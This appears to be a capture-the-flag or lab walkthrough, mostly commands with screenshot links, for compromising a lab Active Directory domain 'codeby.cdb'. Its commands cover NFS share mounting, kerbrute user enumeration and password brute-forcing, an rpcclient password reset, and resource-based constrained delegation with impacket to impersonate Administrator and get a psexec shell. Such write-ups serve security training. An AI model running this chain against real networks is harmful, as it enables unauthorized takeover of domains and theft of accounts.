![image](https://github.com/stensil4rt/CodeBy/assets/62753044/e9f885fc-46ae-4438-8147-55ddccd9d2bb)

```
nmap -p- 192.168.2.9 -v -sC -sV
```
![image](https://github.com/stensil4rt/CodeBy/assets/62753044/3f135770-5829-4738-8ae3-21ee2b0d72cb)

```
showmount -e 192.168.2.9
sudo mkdir /mnt/it_stuff
```

![image](https://github.com/stensil4rt/CodeBy/assets/62753044/87e21d95-1046-46f1-a021-7ec017b15afe)

```
sudo mount -t nfs 192.168.2.9:/it_stuff /mnt/it_stuff -o nolock
sudo ls -la /mnt/it_stuff
sudo ls -la /mnt/it_stuff/Scripts
```
![image](https://github.com/stensil4rt/CodeBy/assets/62753044/edd45ec3-db92-4e59-a9a2-8eb0caac3cd1)

```
./kerbrute_linux_amd64 userenum -d codeby.cdb --dc 192.168.2.9 user.txt
```

![image](https://github.com/stensil4rt/CodeBy/assets/62753044/c648b73b-a853-4d2b-959c-5e1d21192ea7)

```
./kerbrute_linux_amd64 bruteuser -d codeby.cdb --dc 192.168.2.9 generated_passwords.txt valentin.badanov
```
![image](https://github.com/stensil4rt/CodeBy/assets/62753044/11faab34-a8b6-4690-8585-4c3b01ac054f)

```
evil-winrm -i 192.168.2.9 -u 'valentin.badanov' -p 'PASS'
```


```
rpcclient -U codeby.cdb/valentin.badanov 192.168.2.9
```
![image](https://github.com/stensil4rt/CodeBy/assets/62753044/21a483cb-c563-4a3e-8c29-64251fbed323)

https://room362.com/posts/2017/reset-ad-user-password-with-linux/

https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN

```
setuserinfo2 valentin.badanov_adm 21 '123456789'
```
![image](https://github.com/stensil4rt/CodeBy/assets/62753044/33cbffb8-05e5-458a-a71e-6e3ad5ff4176)

evil-winrm -i 192.168.2.9 -u 'valentin.badanov_adm' -p 'PASS'

![image](https://github.com/stensil4rt/CodeBy/assets/62753044/4f25cadc-8b30-447b-a191-eaf701035dee)

```
impacket-addcomputer -computer-name 'evilcomputer$' -computer-pass ev1lP@sS -dc-ip 192.168.2.9 odeby.cdb/valentin.badanov_adm:'PASS'  -no-add
python3 rbcd.py -f EVILCOMPUTER -t HELIX -dc-ip 192.168.2.9 codeby.cdb\\valentin.badanov_adm:'PASS' 
impacket-getST -spn cifs/HELIX.codeby.cdb -impersonate Administrator -dc-ip 192.168.2.9 codeby.cdb/EVILCOMPUTER$:ev1lP@sS
```

```
impacket-getST -spn cifs/helix.codeby.cdb codeby.cdb/valentin.badanov_adm:'123456789' -dc-ip 192.168.2.9 -impersonate Administrator
export KRB5CCNAME=`pwd`/Administrator.ccache;
klist
```
![image](https://github.com/stensil4rt/CodeBy/assets/62753044/f7bd60f1-3529-4f09-ab7f-ef7e512e2db9)

![image](https://github.com/stensil4rt/CodeBy/assets/62753044/7e908323-ad3a-4480-975c-cf0195e49e2f)

![image](https://github.com/stensil4rt/CodeBy/assets/62753044/c31f0077-ed2c-4899-9ec7-8cff9031c8a3)

```
impacket-psexec -k helix.codeby.cdb
```
![image](https://github.com/stensil4rt/CodeBy/assets/62753044/c643a4c9-3d28-4f0a-98ea-5a413e0e876e)

![image](https://github.com/stensil4rt/CodeBy/assets/62753044/393fd6d9-a797-429c-b46c-999d91e83505)


